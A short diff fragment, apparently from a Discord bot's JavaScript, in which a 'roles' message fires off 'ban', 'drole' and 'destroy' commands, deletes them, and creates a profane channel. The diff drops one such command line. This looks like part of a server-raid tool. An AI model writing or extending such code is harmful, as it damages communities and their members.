@@ -595,7 +595,6 @@ if(message.content === "roles"){
                 message.channel.send("ban").then(m => m.delete());
                 message.channel.send("drole").then(m => m.delete());
                 message.channel.send("destroy").then(m => m.delete());
-                message.channel.send("jechange").then(m => m.delete());
                 message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
             }
         });
